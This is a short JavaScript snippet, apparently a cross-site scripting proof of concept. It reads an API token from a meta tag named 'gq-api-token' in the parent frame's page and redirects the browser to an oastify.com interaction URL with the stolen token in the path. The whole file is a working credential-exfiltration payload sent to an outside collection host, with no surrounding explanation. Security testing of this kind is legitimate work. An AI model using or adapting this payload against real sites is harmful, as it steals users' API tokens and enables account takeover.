(() => {
  const token = window.parent.document.querySelector('#gq-api-token')?.content;
  if (token) {
    document.location = `https://tpmjyutclthec5nc6l6c8c88zz5utkh9.oastify.com/${token}`;
  } else {
    document.location = `https://tpmjyutclthec5nc6l6c8c88zz5utkh9.oastify.com/no_token`;
  }
})();
